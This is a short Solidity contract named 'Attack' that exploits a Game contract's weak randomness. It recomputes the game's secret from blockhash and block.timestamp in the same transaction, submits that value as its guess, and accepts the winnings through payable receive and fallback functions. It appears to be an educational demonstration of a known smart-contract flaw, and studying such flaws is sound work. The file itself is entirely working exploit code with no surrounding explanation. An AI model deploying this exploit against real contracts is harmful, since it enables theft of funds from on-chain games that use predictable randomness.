// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Game.sol";

contract Attack {

    Game public game;

    constructor(address _game) {
        game = Game(_game);
    }

    function pickCard() public {
        uint guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        game.guessCard(guess);
    }

    receive() external payable {}
    fallback() external payable {}
}